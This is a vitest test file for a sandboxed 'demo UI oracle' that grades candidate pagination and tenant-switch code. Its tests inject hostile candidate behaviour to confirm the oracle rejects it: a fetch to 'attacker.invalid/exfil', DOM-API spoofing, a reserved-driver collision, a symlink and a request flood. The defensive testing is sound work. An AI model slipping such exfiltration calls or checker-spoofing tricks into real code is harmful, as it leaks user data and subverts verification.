import { describe, expect, it } from 'vitest';
import { mkdtemp, mkdir, rm, writeFile, readFile, symlink } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { demoUiSuiteDigest, runDemoUiSuite } from '../../packages/git-runner/checks/demo-ui-suite.js';
import { buildPaginatedDemo, paginatedClientScript, preparedPaginatedDemo } from '../fixtures/paginated-demo.js';

async function fixture(source: string): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), 'demo-ui-oracle-'));
  await mkdir(join(root, 'demo/seed'), { recursive: true });
  await writeFile(join(root, 'demo/seed/index.ts'), source);
  return root;
}
const applicability = { projectId: 'demo-project', viewId: 'demo-view', manifestDigest: 'a'.repeat(64), composedCommitOid: 'b'.repeat(40), treeOid: 'c'.repeat(40), contractVersion: 1, policyVersion: 1, checkSuiteDigest: demoUiSuiteDigest() };
const run = async (root: string) => (await runDemoUiSuite({ candidateDirectory: root, applicability }))[0]!;
const report = (r: Awaited<ReturnType<typeof run>>) => `${r.result}: ${r.execution.status}; ${r.execution.stdout}`;

describe('trusted demo UI oracle', () => {
  it('pins the trusted browser bridge digest', () => {
    expect(demoUiSuiteDigest()).toMatch(/^[a-f0-9]{64}$/);
    expect(demoUiSuiteDigest()).toBe(demoUiSuiteDigest());
  });
  it('fails the original non-paginated seed with an oracle failure, not startup noise', async () => {
    const root = await fixture(await readFile(new URL('../../demo/seed/index.ts', import.meta.url), 'utf8'));
    try {
      const r = await run(root);
      expect(r.checkId).toBe('mandatory-demo-ui');
      expect(r.result, report(r)).toBe('failed');
      expect(r.execution.stdout).toMatch(/Expected UI state|events|failures/);
      expect(r.execution.stdout).not.toMatch(/Sandbox startup failed|Chromium startup failed/);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);
  it('passes only the prepared correct pagination UI fixture', async () => {
    const root = await fixture(preparedPaginatedDemo);
    try {
      const r = await run(root);
      expect(r.result, report(r)).toBe('passed');
      expect(r.obligationIds).toEqual(['ui-navigation', 'ui-tenant-switch']);
      const events = JSON.parse(r.execution.stdout).facts.events;
      expect(events).toHaveLength(6);
      expect(events.slice(2).map((event: { tenant: string; cursor: string | null }) => [event.tenant, event.cursor])).toEqual([
        ['tenant-b', null], ['tenant-a', null], ['tenant-b', null], ['tenant-a', null],
      ]);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);
  it('rejects switching that retains tenant-A rows and cursor on tenant B', async () => {
    const brokenScript = paginatedClientScript.replace("const r=await fetch('/api/projects?'+q),d=await r.json();list.replaceChildren();", "const r=await fetch('/api/projects?'+q),d=await r.json();");
    expect(brokenScript).not.toBe(paginatedClientScript);
    const root = await fixture(buildPaginatedDemo(brokenScript));
    try {
      const r = await run(root);
      expect(r.result, report(r)).toBe('failed');
      expect(r.execution.stdout).toMatch(/Expected UI state|events|failures/);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);
  it('rejects switching that retains the opaque tenant-A cursor on tenant B', async () => {
    const brokenScript = paginatedClientScript.replace("tenant.addEventListener('change',()=>load(true))", "tenant.addEventListener('change',()=>load(false))");
    expect(brokenScript).not.toBe(paginatedClientScript);
    const root = await fixture(buildPaginatedDemo(brokenScript));
    try {
      const r = await run(root);
      expect(r.result, report(r)).toBe('failed');
      expect(r.execution.stdout).toMatch(/Expected UI state|events|failures/);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);
  it('uses isolated-world DOM and collection intrinsics against candidate spoofing', async () => {
    const source = buildPaginatedDemo(paginatedClientScript.replace(
      "const tenant=document.querySelector('#tenant'),list=document.querySelector('#projects'),status=document.querySelector('#status'),next=document.querySelector('#next-page');",
      "const query=document.querySelector.bind(document),tenant=query('#tenant'),list=query('#projects'),status=query('#status'),next=query('#next-page');document.querySelector=()=>null;",
    ));
    const root = await fixture(source);
    try {
      const r = await run(root);
      expect(r.result, report(r)).toBe('passed');
      expect(JSON.parse(r.execution.stdout).facts.events[0].dom.ids).toEqual(['a-project-01', 'a-project-02']);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);
  it('blocks unknown external requests and records the failed request', async () => {
    const source = buildPaginatedDemo(`${paginatedClientScript} fetch('https://attacker.invalid/exfil').catch(()=>{});`);
    const root = await fixture(source);
    try {
      const r = await run(root);
      expect(r.result, report(r)).toBe('failed');
      const facts = JSON.parse(r.execution.stdout).facts;
      expect(facts.failures.join(' ')).toMatch(/CSP violation observed/);
      expect(facts.requests.some((request: { url: string }) => request.url.startsWith('https://attacker.invalid/'))).toBe(false);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);
  it('rejects a stale applicability digest before candidate execution', async () => {
    const root = await fixture(`throw new Error('candidate executed'); export function createProjectListHandler(){return async()=>Response.json([])}`);
    try {
      await expect(runDemoUiSuite({ candidateDirectory: root, applicability: { ...applicability, checkSuiteDigest: '0'.repeat(64) } })).rejects.toThrow(/digest/i);
      expect(await readFile(join(root, 'demo/seed/index.ts'), 'utf8')).toContain('candidate executed');
    } finally { await rm(root, { recursive: true, force: true }); }
  });
  it('rejects reserved driver collision and candidate symlinks before execution', async () => {
    const root = await fixture(preparedPaginatedDemo);
    try {
      await writeFile(join(root, '.trusted-demo-ui-driver.mjs'), 'throw new Error("candidate control")');
      const collision = await run(root);
      expect(collision.result).toBe('failed');
      expect(collision.execution.stdout).toMatch(/Candidate collides with reserved trusted demo UI driver/);
      await rm(join(root, '.trusted-demo-ui-driver.mjs'));
      await symlink(join(root, 'demo/seed/index.ts'), join(root, 'link.ts'));
      const linked = await run(root);
      expect(linked.result).toBe('failed');
      expect(linked.execution.stdout).toMatch(/Candidate contains a symlink/);
    } finally { await rm(root, { recursive: true, force: true }); }
  });
  it('bounds request flood and records failure rather than a pass', async () => {
    const source = buildPaginatedDemo(`${paginatedClientScript} for(let i=0;i<30;i++)fetch('/api/projects?tenant=tenant-a&limit=2').catch(()=>{});`);
    const root = await fixture(source);
    try {
      const r = await run(root);
      expect(r.result, report(r)).toBe('failed');
      const facts = JSON.parse(r.execution.stdout).facts;
      expect(facts.requestCount).toBeLessThanOrEqual(21);
      expect(facts.failures.join(' ')).toMatch(/request limit|Expected UI state/);
    } finally { await rm(root, { recursive: true, force: true }); }
  }, 45000);
});
